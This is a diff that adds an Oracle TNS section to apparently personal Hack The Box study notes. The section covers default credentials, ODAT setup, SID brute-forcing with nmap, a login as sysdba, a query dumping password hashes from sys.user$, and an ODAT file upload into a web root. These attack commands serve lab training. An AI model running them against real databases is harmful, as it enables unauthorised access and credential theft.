@@ -1006,3 +1006,239 @@ impacket-mssqlclient Administrator@10.129.201.248 -windows-auth
 
 1. Run nmap
 2. Connect using impacket and then `EXEC sp_databases;`
+
+## Oracle TNS
+
+- Communication between Oracle dbs and applications 
+- Protocols such as **IPX/SPX**, **TCP/IP**, **IPv6**, **SSL/TLS**
+
+### Default Configuration
+
+- Port: TCP/1521
+- Protocols: TCP/IP, UDP, IPX/SPX, AppleTalk
+- Remote Management: Oracle 8i/9i
+- Connection: Only Authorized Hosts
+- Encryption: Oracle Net Services
+- Configuration Files: `tnsnames.ora`, `listener.ora`
+- Default Configuration File Location: `$ORACLE_HOME/network/admin`
+- Default Password: `CHANGE_ON_INSTALL`
+- Oracle DBSNMP Default Password: `dbsnmp`
+
+> Note: Many organizations use `finger` with oracle, which is risky and vulnerable if we have knowledge of the home directory.
+
+### tnsnames.ora
+
+- Each service (db or otherwise) has a unique entry in `tnsnames.ora`
+- Each entry usually has the name of a service, the database or service name that clients should use while connecting and the network location of the service.
+
+```
+ORCL =
+  (DESCRIPTION =
+    (ADDRESS_LIST =
+      (ADDRESS = (PROTOCOL = TCP)(HOST = 10.129.11.102)(PORT = 1521))
+    )
+    (CONNECT_DATA =
+      (SERVER = DEDICATED)
+      (SERVICE_NAME = orcl)
+    )
+  )
+```
+
+### listener.ora
+
+- Defines the server side configuration
+
+```
+SID_LIST_LISTENER =
+  (SID_LIST =
+    (SID_DESC =
+      (SID_NAME = PDB1)
+      (ORACLE_HOME = C:\oracle\product\19.0.0\dbhome_1)
+      (GLOBAL_DBNAME = PDB1)
+      (SID_DIRECTORY_LIST =
+        (SID_DIRECTORY =
+          (DIRECTORY_TYPE = TNS_ADMIN)
+          (DIRECTORY = C:\oracle\product\19.0.0\dbhome_1\network\admin)
+        )
+      )
+    )
+  )
+
+LISTENER =
+  (DESCRIPTION_LIST =
+    (DESCRIPTION =
+      (ADDRESS = (PROTOCOL = TCP)(HOST = orcl.inlanefreight.htb)(PORT = 1521))
+      (ADDRESS = (PROTOCOL = IPC)(KEY = EXTPROC1521))
+    )
+  )
+
+ADR_BASE_LISTENER = C:\oracle
+```
+
+- In short, `tnsnames.ora = client side configuration` and `listener.ora = server side configuration`
+- **PL/SQL Exclusion List**:
+    - User created txt file (`PlsqlExclusionList`)
+    - Location: `$ORACLE_HOME/sqldeveloper`
+    - Purpose: Contains the PL/SQL packages/types that're excluded from execution.
+    - It is a blacklist that cannot be accessed through the Oracle Application Server.
+
+| Setting | Description |
+| --- | --- |
+| `DESCRIPTION` | A descriptor that provides a name for the database and its connection type. |
+| `ADDRESS` | The network address of the database, which includes the hostname and port number. |
+| `PROTOCOL` | The network protocol used for communication with the server. |
+| `PORT` | The port number used for communication with the server. |
+| `CONNECT_DATA` | Specifies the attributes of the connection, such as the service name or SID, protocol, and database instance identifier. |
+| `INSTANCE_NAME` | The name of the database instance the client wants to connect. |
+| `SERVICE_NAME` | The name of the service that the client wants to connect to. |
+| `SERVER` | The type of server used for the database connection, such as dedicated or shared. |
+| `USER` | The username used to authenticate with the database server. |
+| `PASSWORD` | The password used to authenticate with the database server. |
+| `SECURITY` | The type of security for the connection. |
+| `VALIDATE_CERT` | Whether to validate the certificate using SSL/TLS. |
+| `SSL_VERSION` | The version of SSL/TLS to use for the connection. |
+| `CONNECT_TIMEOUT` | The time limit in seconds for the client to establish a connection to the database. |
+| `RECEIVE_TIMEOUT` | The time limit in seconds for the client to receive a response from the database. |
+| `SEND_TIMEOUT` | The time limit in seconds for the client to send a request to the database. |
+| `SQLNET.EXPIRE_TIME` | The time limit in seconds for the client to detect a connection has failed. |
+| `TRACE_LEVEL` | The level of tracing for the database connection. |
+| `TRACE_DIRECTORY` | The directory where the trace files are stored. |
+| `TRACE_FILE_NAME` | The name of the trace file. |
+| `LOG_FILE` | The file where the log information is stored. |
+
+### Environment Setup
+
+- Some packages are needed to be downloaded to interact with the TNS server.
+
+```bash
+LordA2117@htb[/htb]$ sudo apt-get update
+sudo apt-get install -y build-essential python3-dev libaio1
+cd ~
+wget https://files.pythonhosted.org/packages/source/c/cx_Oracle/cx_Oracle-8.3.0.tar.gz
+tar xzf cx_Oracle-8.3.0.tar.gz
+cd cx_Oracle-8.3.0
+python3 setup.py build
+sudo python3 setup.py install
+cd ~
+git clone https://github.com/quentinhardy/odat.git
+cd odat/
+pip install python-libnmap
+git submodule init
+git submodule update
+sudo apt-get install python3-scapy -y
+sudo pip3 install colorlog termcolor passlib python-libnmap
+sudo apt-get install build-essential libgmp-dev -y
+pip3 install pycryptodome
+pip3 install openpyxl
+
+Hit:1 https://deb.parrot.sh/parrot lory InRelease
+Hit:2 https://deb.parrot.sh/direct/parrot lory-security InRelease
+Hit:3 https://deb.parrot.sh/parrot lory-backports InRelease
+Reading package lists... Done
+Reading package lists... Done
+Building dependency tree... Done
+Reading state information... Done
+build-essential is already the newest version (12.9).
+python3-dev is already the newest version (3.11.2-1+b1).
+python3-dev set to manually installed.
+libaio1 is already the newest version (0.3.113-4).
+libaio1 set to manually installed.
+```
+
+- Testing ODAT (Oracle Database Attacking Tool):
+    - Open Source tool to enumerate and exploit vulns such as SQLi, RCE and privesc in Oracle Databases.
+
+```bash
+$ ./odat.py -h
+
+{all,tnscmd,tnspoison,sidguesser,snguesser,passwordguesser,utlhttp,httpuritype,utltcp,ctxsys,externaltable,dbmsxslprocessor,dbmsadvisor,utlfile,dbmsscheduler,java,passwordstealer,oradbg,dbmslob,stealremotepwds,userlikepwd,smb,privesc,cve,search,unwrapper,clean}
+               ...
+
+            _  __   _  ___ 
+           / \|  \ / \|_ _|
+          ( o ) o ) o || | 
+           \_/|__/|_n_||_| 
+-------------------------------------------
+  _        __           _           ___ 
+ / \      |  \         / \         |_ _|
+( o )       o )         o |         | | 
+ \_/racle |__/atabase |_n_|ttacking |_|ool 
+-------------------------------------------
+
+By Quentin Hardy (quentin.hardy@protonmail.com or quentin.hardy@bt.com)
+```
+
+### Footprinting The Service
+
+- nmap:
+    - SID: a unique identifier for a db instance. We connect to an instance using the SID. If the client doesn't specify the SID, the standard one defined in tnsnames.ora is used.
+
+```bash
+sudo nmap -p1521 -sV 10.129.204.235 --open
+```
+
+```bash
+sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute # bruteforce Oracle SID
+```
+
+- ODAT:
+
+```bash
+./odat.py all -s 10.129.204.235
+```
+
+- SQLPlus:
+
+```bash
+sudo apt install oracle-instantclient-sqlplus # installation
+```
+
+if you encounter `sqlplus: error while loading shared libraries: libsqlplus.so: cannot open shared object file: No such file or directory`, do this
+
+```bash
+sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig
+```
+
+```bash
+sqlplus scott/tiger@10.129.204.235/XE # Login
+```
+
+- Oracle RDBMS Interaction:
+
+```bash
+select table_name from all_tables; //Select all tables
+```
+
+- Oracle RDBMS - Database Enumeration
+
+```bash
+sqlplus scott/tiger@10.129.204.235/XE as sysdba
+```
+
+- Oracle RDBMS Extract Password Hashes:
+
+```bash
+select name, password from sys.user$;
+```
+
+- Default Paths:
+
+| OS | Path |
+| --- | --- |
+| Linux | `/var/www/html` |
+| Windows | `C:\inetpub\wwwroot` |
+
+- Oracle RDBMS File Upload:
+
+```bash
+echo "Oracle File Upload Test" > testing.txt # Create the file
+./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt # Upload the file according to the default paths and OS
+```
+
+```bash
+curl -X GET http://10.129.204.235/testing.txt # test if the upload worked by trying to access the webserver at port 80 with the file.
+```
+
+### Exercises
+
+1. use `./odat.py` as shown in the notes to brute the db name (we'll get `XE`). Then use the default credentials scott/tiger to login. Use the command `sqlplus scott/tiger@10.129.205.19/XE as sysdba` then dump password hashes.
